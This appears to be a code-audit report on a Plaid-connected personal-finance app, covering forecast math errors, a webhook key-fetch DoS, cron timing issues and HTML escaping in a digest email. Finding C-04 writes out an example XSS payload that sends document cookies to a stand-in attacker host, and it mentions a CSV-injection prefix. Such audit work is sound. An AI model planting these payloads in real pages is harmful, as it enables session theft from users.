### [C-01] Forecast baseline double-counts recurring streams against per-category totals — `src/lib/forecast/baseline.ts:65-74` + `src/lib/db/queries/forecast.ts:199-219`

**Problem:** `computeBaseline` computes monthly outflows as
`recurringMonthlyOutflow + sum(categoryBaseline)` — i.e. **both** the recurring streams *and* the per-category trailing median. But `getForecastHistory` already subtracts each recurring stream's monthly equivalent out of its per-category bucket (lines 199-209) precisely to prevent double-counting in the *AI-prompt* path that uses `categoryHistory` directly. The baseline engine then re-adds the same recurring totals on top of the (already-attenuated) categorical history. Net effect: the engine does not double-count, but only because the query made an upstream compensating subtraction; if the query is changed (or if the user has multiple streams in the same PFC where the floor-at-0 in `forecast.ts:208` clips one out), the engine projects too much outflow.

There is a second, real off-by-one: `getForecastHistory` reads transactions from `sinceDate = (now.month - 3, day=1)` through `now`, but the loop at `forecast.ts:181` only keeps `monthsAgo` in `[1..3]` (skips current month). Plaid PFC for the trailing 3 months is bucketed; the recurring-stream subtraction at line 207 uses `streamMonthlyEquivalent` (a single scalar) and subtracts it from **every month** identically. If a stream started 2 months ago, you subtract its monthly equivalent from a month it never actually hit, driving that month's category total negative (clipped to 0 by `Math.max(0, ...)`). Median is then taken over a clipped-zero bucket — which under-projects future spend in that category.

**Why it matters:** The baseline drives every dollar figure in `/simulator`, every "scenario delta" the AI summarizes, every goal ETA. A category that quietly clamps to 0 because of stream subtraction lifecycle mismatch under-projects spend for the rest of the horizon, making the user's projected end-cash look larger than reality. This is silent financial mis-projection — exactly the failure mode the simulator is supposed to prevent.

**Recommended fix:**
1. Pick one boundary for recurring/non-recurring decomposition. Either:
   (a) `getForecastHistory` returns raw category totals, and `computeBaseline` does the recurring/non-recurring split itself (current engine math implies this), OR
   (b) `getForecastHistory` returns "non-recurring residual" and `computeBaseline` adds recurring on top (current query math implies this).
   They cannot both be true. The cleanest fix is (a): drop the subtraction loop in `forecast.ts:200-209` and let the engine consume raw PFC monthly totals. That also fixes the lifecycle off-by-one.
2. Add a property test: `sum(scenario.outflows) ≈ sum(historical_outflows_excluding_transfers)` within ±5% on a stable 3-month window. This regression catches future double/under-counting.

### [C-02] Insight cron's "no current-week data" recovery never fires for empty snapshots — `src/lib/insights/generate.ts:39-43` vs `src/lib/db/queries/insights-data.ts:225-228`

**Problem:** `generateInsightForUser` expects `collectSnapshot` to throw `"Not enough data this week to summarize"` when `isEmpty` is true, but `collectSnapshot` does NOT throw — it returns the snapshot with `isEmpty: true`. `generateInsightForUser:41-43` then **does** check `snapshot.isEmpty` and throws the expected message string. So far so good. But examine the cron handler closely: `src/app/api/cron/insight/route.ts:55-66` catches an error and pattern-matches on `err.message === 'Not enough data this week to summarize'` to demote the failure to a "skipped". The string in `generate.ts:42` is **exactly** that, so this works.

**However**, `collectSnapshot` filters `byCategoryThisWeek` to entries with `total > 0` (line 165) — which after PostgreSQL's `SUM(numeric) > 0` filter in the WHERE clause should be redundant — but `goalSnapshots` and `recurring` are NOT filtered to "non-empty" before the `isEmpty` check. A user with one inactive recurring stream and any goal will have `isEmpty === false` even with zero transaction activity. The snapshot reaches Anthropic with empty `byCategoryThisWeek`, `totalThisWeek = 0`, and Claude is forced to write a 3-paragraph weekly recap from an empty week. The system prompt's escape hatch ("Not enough data this week to summarize") is reachable but not deterministic — Haiku frequently *will* hallucinate prose anyway when fed sparse-but-not-empty input.

**Why it matters:** A backfilled / inactive user gets a hallucinated insight written about a week with no real transaction activity. That insight is then stored, displayed on /insights, and quoted in the dashboard teaser. The whole product premise (AI-coaching grounded in real numbers) breaks. Worse, the cron will keep regenerating these every Monday because `hasNewActivity` is anchored to `transactions.createdAt > insights.generatedAt` — a single backfilled transaction past `generatedAt` re-fires generation against an empty week.

**Recommended fix:**
1. Tighten `isEmpty` in `insights-data.ts:225-228` to require `byCategoryThisWeek.length === 0 && (goalSnapshots.length === 0 || all goals.progress are zero/uninitialized) && hitThisWeekStreams.length === 0`. The narrow case is "no real this-week activity" — empty `byCategoryThisWeek` and no recurring stream that hit this week is the right boundary.
2. In `cron/insight/route.ts`, sentinel-match by class instead of string. Define `class EmptyWeekError extends Error` in `generate.ts`, throw it, and `instanceof` check it in the cron. String-equality is brittle to future copy edits.

### [C-03] Webhook JWT verified before kid lookup permits unbounded Plaid API hits via crafted `kid` — `src/lib/plaid/webhook.ts:40-95`

**Problem:** `verifyPlaidWebhook` decodes the JWT header, extracts `kid`, then calls `getVerificationKey(kid)` which reaches out to Plaid's `webhookVerificationKeyGet` if the kid is not in the in-memory cache. Cache is keyed by kid with no upper bound on entries and no negative caching for unknown kids. An attacker crafts JWTs with random `kid` values, posts to `/api/plaid/webhook`, and each request triggers an outbound Plaid API call whose response is cached forever (until cold start). This:

- Floods Plaid's API quota (real money — Plaid charges per request in production tiers above the free quota).
- Inflates `KEY_CACHE` map memory unboundedly across attacker-chosen kids — eventual OOM on long-lived instances.
- Bypasses `webhook-flood-guard.ts`, whose only job is to skip `error_log` writes for header-less requests. Requests *with* a JWT header still log every failure to `error_log` (route.ts:29-35), so an attacker who supplies any JWT shape (even invalid) gets logged, AND triggers the Plaid API call before signature verification fails.

**Why it matters:** This is exactly the DoS amplification class fixed for `error_log` (commit 00093bd) but reintroduced via the verification-key fetch. The flood guard fixed the symptom, not the underlying "anonymous attacker can cause server-side work" problem.

**Recommended fix:**
1. Cap `KEY_CACHE.size` and reject lookups when the cap is hit (e.g. 32 entries — far more than Plaid actually rotates through in 24h).
2. Negatively cache failed lookups: a kid that returned 404 from Plaid should be remembered as `{ jwk: null, expiresAt: now + 5min }` so repeated hits don't re-fetch.
3. Add a per-IP rate limit at the route handler before any verification work. Even 30 req/min per IP closes the amplification vector.
4. Tighten the flood guard: `shouldLogWebhookVerificationFailure` should also return `false` for kid-fetch failures, since those produce a downstream "JWS verification failed" that gets logged unconditionally at route.ts:29-35.

### [C-04] Resend digest sends raw `error_log.message` content into HTML email; `escapeHtml` does not escape single quotes — `src/app/api/cron/digest/route.ts:152-156, 202-208`

**Problem:** `renderErrorsSection` interpolates `e.op` and `e.message` into an HTML table via `escapeHtml`. The escape function (`route.ts:202-208`) escapes `&`, `<`, `>`, and `"` but NOT `'` (apostrophe). Within an HTML attribute context using single-quote delimiters, an attacker-controlled message containing `'` could break out — but here the table cells use no attributes around the message. So the immediate XSS surface is small.

The deeper problem: `error_log.message` is fed by `logError(op, err, ctx)` and is the raw `err.message`, which can contain attacker-controlled content. The webhook handler logs `JSON verification failed` for arbitrary JWT inputs, but other paths log `err.message` from network calls — Plaid/Anthropic error responses, Resend error responses, and Postgres errors — that may contain user-supplied data. Anthropic's API for example echoes the request body in error messages. A user controls transaction descriptions (Plaid sourced) and goal names (their own input). A goal name like `<img src=x onerror=fetch('//attacker'+document.cookie)>` would be:
- stored verbatim in Postgres (good — DB layer is parametrized).
- echoed in `err.message` IF a downstream Anthropic / Plaid call surfaces it in an error.
- written to `error_log.message` by `logError`.
- rendered into the daily digest email via `escapeHtml(e.message)`.

`escapeHtml` blocks the obvious `<img>` injection. But `'` not being escaped means any future HTML-attribute rendering (e.g. `<td title='${escapeHtml(e.message)}'>`) opens an XSS hole.

**Why it matters:** Single-user app today (the user is themselves the attacker, low risk). The moment a second user is onboarded or a Plaid webhook delivers a CSV-injection payload (`=cmd|...`) which Excel/Outlook auto-executes when the user clicks "open in Excel", the digest email becomes the attack vector. Stored XSS in operational dashboards is well-known to be the path of least resistance into ops staff.

**Recommended fix:**
1. Add `'` to `escapeHtml`: `.replace(/'/g, '&#39;')`. This is a 3-char change.
2. Add `\` and ` `-control-byte filtering to `error_log.message` writes in `logger.ts` (truncate to a sane length; strip control chars).
3. Long-term: don't render `e.message` raw into emails at all — render `e.op` plus a short fixed status, with the full message accessible only in the DB.

### [W-01] `goal-projection` ignores baseline projection cash and counts contributions even when projected cash is insufficient — `src/lib/forecast/goal-projection.ts:103-113`

**Problem:** `findGoalETA` loops over `projection` and adds `goal.monthlyContribution` to `cumulative` each month, returning the first month where cumulative ≥ target. It never reads `month.endCash`. So a savings goal will report ETA = "Aug 2026" even if `endCash` for every projected month is negative (the user has no cash to save). The simulator presents this ETA as if it were achievable, but the projection itself shows the user underwater.

**Why it matters:** Misleading goal ETAs in the very simulator the user trusts to tell them whether a what-if is feasible. The sentinel "unreachable within horizon" path (`forecast-prompt.ts:177-179`) is unreachable when contributions exceed cash but stay positive.

**Recommended fix:** In `findGoalETA`, gate `cumulative += goal.monthlyContribution` on `month.endCash >= goal.monthlyContribution` (or equivalently, on cash being non-negative after contribution). Alternatively, compute a parallel "feasible ETA" that returns null if cash goes negative anywhere on the path. Add a test: goal with $500/mo contribution, projection where `endCash` goes negative in month 3 — current code reports ETA at $5000 target / $500 = month 10, fix reports null.

### [W-02] `monthsBetween` uses 30-day-month approximation in `pace.ts:59-63`

**Problem:** Pace label calculation divides the literal millisecond delta by `30 * DAY_MS`, which means months are 30.0 days. For a target date 365 days out, `monthsRemainingByDate = 12.166…`, off by 0.17 vs calendar. For shorter horizons (e.g. a 14-day cliff), the rounding pushes the goal across the on-pace/behind boundary and the displayed label flips spuriously.

**Why it matters:** The boundary case `pace === 1` produces "on pace" vs "behind" in the goal pill on dashboard. The user sees status changes that don't match reality.

**Recommended fix:** Replace `monthsBetween` with calendar-aware month math:
```ts
function monthsBetween(fromIso: string, toIso: string): number {
  const f = new Date(`${fromIso}T00:00:00Z`);
  const t = new Date(`${toIso}T00:00:00Z`);
  const yMonths = (t.getUTCFullYear() - f.getUTCFullYear()) * 12;
  const mMonths = t.getUTCMonth() - f.getUTCMonth();
  const dayFraction = (t.getUTCDate() - f.getUTCDate()) / 30;
  return yMonths + mMonths + dayFraction;
}
```

### [W-03] `searchTransactionsAction` does not escape `%` and `_` in user query — `src/lib/transactions/actions.ts:47-79`

**Problem:** `pat = '%' + trimmed + '%'` then passed to `ilike(transactions.name, pat)`. PostgreSQL `ILIKE` treats `%` and `_` as wildcards, so a user query of `"%"` matches every row. Similarly `"_"` matches single chars. The `MIN_QUERY = 2` gate doesn't help because `"a%"` is 2 chars and matches everything starting with "a".

**Why it matters:** Self-DoS: typing `%` in the ⌘K palette returns every transaction up to limit 10, but the query plan scans the index without using it. With 10 years of transactions this is slow but not catastrophic. More importantly, multi-tenant safety: the query is correctly user-scoped via `eq(plaidItems.userId, ...)`, so this is pure DoS not data leak.

**Recommended fix:** Escape `%`, `_`, `\` in `trimmed` before wrapping with `%...%`:
```ts
const escaped = trimmed.replace(/[\\%_]/g, (c) => `\\${c}`);
const pat = `%${escaped}%`;
```

Same fix needed in `db/queries/transactions.ts:71` (the page-level search).

### [W-04] `exchangePublicToken` runs full backfill before encrypting+storing token; mid-flight crash leaks tokens — `src/lib/plaid/actions.ts:62-77`

**Problem:** `exchangePublicToken` does:
1. `plaid.itemPublicTokenExchange` → fresh access_token in memory.
2. `db.insert(plaidItems).values({...accessToken: encryptToken(token)})` → encrypted token at rest.
3. `await syncItem(inserted.id)` → full sync, may take 30s+.

If step 3 throws, the encrypted token row is committed (no transaction wrapping) but no sync data is stored. That's recoverable — the user retries. Less recoverable: the **plaintext** access_token is held in JS closures (the `exchange.data.access_token` variable, plus `decryptToken` re-derives it inside `syncItem` at sync.ts:56). On a process crash mid-sync (Vercel function timeout, OOM), the plaintext token is never zeroed and may end up in a heap dump shipped to logging.

**Why it matters:** The threat model in `SECURITY.md` covers at-rest leaks (DB dump). Heap-dump-via-crash isn't mainline but is realistic on a serverless platform that snapshots state.

**Recommended fix:**
1. Don't run `syncItem` inline after `exchangePublicToken`. Return immediately, and let the `/settings` page (or a redirect) trigger a background sync via the existing `syncItemAction`. This shrinks the plaintext-token-in-memory window from "30+ seconds during initial backfill" to "milliseconds during exchange".
2. In `syncItem` (sync.ts:56), explicitly null `item.accessToken` in a `finally` after the function returns to assist GC. Won't prevent heap dumps but reduces window.

### [W-05] `cron/balances` "accountsTouched" inflates on multi-item users — `src/app/api/cron/balances/route.ts:52-63`

**Problem:** The handler loops every active item, calls `accountsBalanceGet` (returns ALL accounts the institution exposes for that item), and runs a per-account UPDATE keyed on `plaidAccountId`. `plaidAccountId` is unique per Plaid account but the WHERE has no item-id scope: if two items happen to share an `account_id` value (Plaid documents these as globally unique, but their format `eyJ…` is opaque base64; collision is theoretically zero but assumption-only), the update affects rows across items. More realistic: a freshly-disconnected-then-reconnected item produces fresh `plaidAccountId` values; the old rows aren't deleted (`onDelete: 'cascade'` only fires on item deletion) and the new ones get updated. The old rows fall stale.

**Why it matters:** Net-worth math reads `current_balance` from `financial_account` rows. Stale rows with outdated balances inflate / deflate net worth.

**Recommended fix:** Add `eq(financialAccounts.itemId, item.id)` to the UPDATE WHERE clause, so balances only update for the item we're refreshing. Separately, on `markItemReconnected`, soft-delete or hard-delete prior `financial_account` rows for that item before resync.

### [W-06] `getNetWorthSparkline` rolls forward without considering account opens/closes — `src/lib/db/queries/dashboard.ts:209-258`

**Problem:** Walks transactions backwards from "today's net worth" (`summary.netWorth`) to derive historical net worth. Assumes the set of accounts and their opening balances is constant across the 30-day window. New accounts added mid-window inflate "30 days ago" net worth (their balance is in `summary.netWorth` but no compensating outflow exists in transactions). Closed accounts have the opposite effect.

**Why it matters:** Sparkline is on the dashboard and forms the headline at-a-glance signal. Users opening a new investment account in the last 30 days will see a fake $50k jump 30 days ago.

**Recommended fix:** Filter the JOIN by `financialAccounts.createdAt <= startStr` so only accounts that existed at window start contribute. Same for the walk-back: a transaction on an account that didn't exist 25 days ago shouldn't update the running sum past that date.

### [W-07] Cron `digest` race: `cron.digest` log row written AFTER email send, but other crons may fire during digest send — `src/app/api/cron/digest/route.ts:79-102`

**Problem:** Comment at line 30-32 claims "Sends BEFORE writing the cron.digest run row, so the digest never includes itself in the next day's count." Let's verify: in code, the email send loop is at line 70-90, then `logRun('cron.digest', ...)` at line 92. So the comment is correct — digest run is logged after send. But: the SELECT on errorLog at line 41-46 happened *before* the emails sent. Any errors written DURING send (e.g., `cron.digest.send` failures from Resend transient outages, line 88) are missed in this digest, picked up tomorrow.

That's intended behavior. The real issue: the 24-hour window `since = now - DAY_MS` (line 39) does NOT align with Vercel cron schedule. Digest runs at 14:00 UTC. Yesterday's digest also ran at 14:00 UTC and logged `cron.digest` at maybe 14:00:30. Today's digest fires at 14:00:00, computes `since = 14:00:00 - 24h`, and the prior `cron.digest` row at 14:00:30 falls **outside** the window by 30s — so prior-digest run isn't visible to monitoring. Conversely, if today's digest is delayed 2 minutes, yesterday's row IS visible, and it shows up as a `cron.digest` info row in today's digest (harmless, just noise).

The bigger issue: `nightlyMissing = !runs.some((r) => r.op === 'cron.nightly_sync')` (line 55). Nightly sync runs at 10:00 UTC and writes `cron.nightly_sync` (line 54-63 of sync route). Window starts at digest_now - 24h = 14:00 UTC yesterday. So nightly's 10:00 UTC of yesterday is OUTSIDE the window (14:00 yesterday > 10:00 yesterday). The current day's nightly at 10:00 UTC IS in the window (14:00 today > 10:00 today, 4h ago). So the check passes if and only if today's nightly ran successfully. Good. But if the cron schedule shifts, the alignment breaks silently.

**Why it matters:** Ops digest is supposed to be authoritative. Off-by-a-few-minutes alignment with cron schedule means the digest occasionally false-positives "nightly sync NOT SEEN" if today's 10:00 UTC nightly is delayed past 14:00.

**Recommended fix:** Anchor the window on cron schedule, not `now - 24h`. Use `since = startOfTodayUtc - 24h` so it always covers the prior calendar day plus current AM, regardless of digest start time. Even simpler: use `since = now - (25 * HOUR)` to give a 1-hour buffer.

### [W-08] `lookupForecastNarrative` returns scenario-not-owned the same way as scenario-not-found — `src/lib/forecast/narrative-actions.ts:43-44, 77-78`

**Problem:** Both narrative actions check ownership via `isScenarioOwnedByUser` and return `{ ok: false, error: 'Scenario not found' }` if false. Combined with the userid check at the top (`if (!session?.user?.id) return { ok: false, error: 'Unauthorized' }`), and the `getScenario` query which returns null for "not exists OR not owned" — this is correct user-scoping behavior. **However**, the `parseLookupInput` validator (line 213-233) uses a hand-rolled cast `input.overrides as ScenarioOverrides` (line 231) without validating the override SHAPE. An attacker passing a malformed-but-`object`-typed `overrides` reaches `buildInputHash` (line 32-41) which `JSON.stringify`s it; nothing crashes, but cache pollution is possible: forge a payload that JSON-stringifies the same as an existing one, you steal that scenario's cached narrative? No — `isScenarioOwnedByUser` runs first and is properly scoped. But `JSON.stringify` is non-canonical (key order matters), so a benign user re-saving `{a:1, b:2}` vs `{b:2, a:1}` gets cache misses.

**Why it matters:** Cache misses cost real Anthropic dollars on every save. The hand-rolled "the engine will fail loudly" defense (line 211-212) is wrong in the cache-key path because the engine isn't called on cache HIT — only the hash is computed.

**Recommended fix:**
1. Reuse `scenarioOverridesSchema` from `scenario-zod.ts` here. Validate before hashing.
2. Use a canonical-form serializer (`json-stable-stringify` or hand-roll one) so re-ordered keys produce identical hashes. This isn't security-critical but is a real cost driver.

### [W-09] `applyLumpSums` allows negative outflows when chained after other appliers — `src/lib/forecast/apply-overrides.ts:248-263`

**Problem:** Lump sums chain after `applyRecurringChanges` and `applySkipRecurringInstances`. Those clip inflows/outflows at 0 (`Math.max(0, ...)`). `applyLumpSums` does NOT clip — at lines 254-255 it adds to whichever side then directly writes. For a lump sum where `amount < 0`, `outflowDelta += -sum.amount`, then `newOutflows = month.outflows + outflowDelta`. If a user enters a $1000 negative lump sum on a month whose recurring-change-induced outflow is already $0 (because pause cleared it), the resulting `newOutflows` is fine ($1000). But the inflow side: if a positive lump sum of $5000 is added to a month whose `inflows` was *clipped* to 0 by `applyRecurringChanges`, the prior chain dropped real inflow signal. Lump sum then re-adds it. Order matters. The engine docstring says "override application order matters for mental modeling but does NOT cause mathematical conflicts — each step targets a different part of the model" (engine.ts:21-22) — this is wrong. The 0-clip in earlier steps loses information that later steps can't recover.

**Why it matters:** A recurring-change scenario combined with a lump sum produces math that the user can't predict from looking at the inputs. E.g. "Pause salary + add $10k lump sum next month" — the salary monthly equivalent gets subtracted from `inflows`, clipped at 0, you've effectively erased non-salary inflows too. Net-cash result is wrong by exactly the non-salary inflow amount.

**Recommended fix:**
1. Track signed deltas per-month rather than clipping at 0 per applier.
2. Only clip when computing displayed totals, not in the chain.
3. Add property tests: `applySkip(applyChanges(p))` ≡ `applyChanges(applySkip(p))` for non-overlapping inputs (commutativity).

### [W-10] `frequencyToMonthlyMultiplier` and `streamMonthlyEquivalent` disagree on `SEMI_MONTHLY` — `src/lib/db/queries/recurring.ts:169-185` vs `src/lib/db/queries/forecast.ts:34-43`

**Problem:**
- `recurring.ts` `SEMI_MONTHLY` returns 2.
- `forecast.ts` `SEMI_MONTHLY` returns 2 — agrees.
- `recurring.ts` `BIWEEKLY` returns 26/12 ≈ 2.1667.
- `forecast.ts` `BIWEEKLY` returns 2.167 — agrees within rounding.
- `recurring.ts` `WEEKLY` returns 52/12 ≈ 4.3333.
- `forecast.ts` `WEEKLY` returns 4.333.
- `recurring.ts` `ANNUALLY` returns 1/12 ≈ 0.0833.
- `forecast.ts` `ANNUALLY` returns `amount / 12` — agrees.

But there's also `apply-overrides.ts:3-10` which only handles `weekly | biweekly | monthly` (no `semi_monthly` or `annually`). The `ForecastHistory.recurringStreams.cadence` type is `'weekly' | 'biweekly' | 'monthly'` (types.ts:79). `getForecastHistory` maps via `toCadence` (forecast.ts:49-58) which collapses `SEMI_MONTHLY` and `ANNUALLY` to `monthly`. So semi-monthly and annual streams get projected at their amount-per-occurrence, not their monthly equivalent. A $50 biannual stream becomes $50/month in projections.

**Why it matters:** Annual subscriptions (Domain registrar, AWS Reserved instances) are projected as if they hit every single month, inflating outflows by 12x for those streams. Semi-monthly (twice a month, common for payroll) is projected as monthly, halving the income.

**Recommended fix:** Either:
1. Expand `cadence` to include `semi_monthly | annually` and update `monthlyEquivalent` in apply-overrides.ts. OR
2. In `toCadence`, **convert the amount** along with the cadence collapse: a $1200 annual stream becomes a $100 monthly stream (option 1 is cleaner — preserving user-readable cadence).

### [W-11] `applyCategoryDeltas` deltas without `startMonth`/`endMonth` are applied to all projected months including past — `src/lib/forecast/apply-overrides.ts:33-42`

**Problem:** When `d.startMonth` is unset, condition `if (d.startMonth && month.month < d.startMonth) continue` evaluates false and the delta applies. The projection range starts at `addMonths(currentMonth, 1)` (baseline.ts:66), so "past months" aren't a concern in the projection itself. But if a saved scenario has `startMonth: '2025-12'` and the user reopens it in May 2026, those past months are **outside** the projection window, so the delta silently has no effect (correct). However, `endMonth` undefined means the delta applies forever; no horizon clamp.

**Why it matters:** Mostly correct. The case to flag: user saves a scenario in Jan with `categoryDelta: -200, startMonth: 'Feb', endMonth: undefined`. They reopen it in July. Delta applies from Feb through horizon end (default 12 months from July = July 2027). This can be unexpected — a user thinking "save my New Year plan" gets a delta applied way past where they intended.

**Recommended fix:** This is design intent more than a bug. Document it in `types.ts:10-16` and ensure the saved-scenario UI surfaces the implicit "open-ended" warning. No code change strictly required.

### [I-04] `getDistinctCategories` returns raw PFC strings; `getCategoryOptions` returns humanized — `src/lib/db/queries/transactions.ts:149-166` and `categories.ts:30-74`

### [I-05] `fetchFingerprintInputs` uses `now.getUTC*` for date calculation but `Date.now()` for sync max — `src/lib/forecast/history-fingerprint.ts:46-47`

`todayUtc` is computed from `getUTCFullYear/Month/Date`. Within the same call, `latestSyncDate` is computed from `new Date(syncStats.latestSync).toISOString().slice(0,10)` — also UTC, so consistent. Just noting that should anyone use local time anywhere here, the cache key invalidation logic breaks silently (Pacific Time users get stale fingerprints until 4pm).

### [I-06] `humanizeCategory` and `prettifyPfc` and `humanizePfc` duplicate — `src/lib/format/category.ts`, `src/lib/db/queries/forecast.ts:15-22`, `src/lib/db/queries/categories.ts:133-140`

### [I-07] `searchTransactionsAction` `?? sql\`true\`` is dead code — `src/lib/transactions/actions.ts:69-73`

`or(...)` with two non-null args from `ilike` always returns truthy SQL; `?? sql\`true\`` is unreachable. Drizzle's `or` only returns undefined on empty input. Remove the fallback for clarity.
